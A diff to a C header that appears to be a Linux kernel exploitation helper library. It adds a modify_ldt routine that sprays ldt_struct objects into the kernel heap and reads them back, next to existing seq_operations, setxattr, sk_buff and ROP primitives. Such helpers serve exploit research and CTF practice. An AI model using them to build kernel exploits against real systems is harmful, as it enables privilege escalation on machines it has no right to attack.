@@ -1,6 +1,7 @@
 #ifndef __KUTIL_H__
 #define __KUTIL_H__
 
+#define ENABLE_LDT_STRUCT
 #define ENABLE_SEQ_OPERATIONS
 #define ENABLE_SHM_FILE_DATA
 #define ENABLE_TIMERFD_CTX
@@ -27,6 +28,44 @@
     fprintf(stderr, "[%s] %s: %s\n", __func__, msg, strerror(errno));          \
     exit(EXIT_FAILURE);                                                        \
   } while (0)
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+#ifdef ENABLE_LDT_STRUCT
+#include <asm/ldt.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define CMD_READ_LDT 0
+#define CMD_WRITE_LDT 1
+
+void kmalloc16_ldt_struct() {
+  struct user_desc desc;
+  desc.base_addr = 0xff0000;
+  desc.entry_number = 0x8000 / 8;
+  desc.limit = 0;
+  desc.seg_32bit = 0;
+  desc.contents = 0;
+  desc.limit_in_pages = 0;
+  desc.lm = 0;
+  desc.read_exec_only = 0;
+  desc.seg_not_present = 0;
+  desc.useable = 0;
+
+  int err = syscall(SYS_modify_ldt, CMD_WRITE_LDT, &desc, sizeof(desc));
+  if (err == -1) {
+    ABORT("syscall");
+  }
+}
+
+long read_ldt_struct(size_t size, char *buf) {
+  if (!buf) {
+    buf = (char *)malloc(size);
+  }
+
+  return syscall(SYS_modify_ldt, 0, buf, size);
+}
+#endif
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef ENABLE_SEQ_OPERATIONS
@@ -315,6 +354,7 @@ void kmalloc_setxattr(size_t size, char *buf) {
   }
 }
 #endif
+
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef ENABLE_SK_BUFF
 #include <assert.h>
@@ -356,8 +396,8 @@ char *kfree_sk_buff(int pair[2], size_t size) {
   assert(n == size - SKB_SHARED_INFO_SIZE);
   return data;
 }
-
 #endif
+
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #ifdef ENABLE_ROP
 #include <unistd.h>
@@ -665,4 +705,5 @@ void dump(unsigned char *p, size_t len) {
 }
 #endif
 
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 #endif
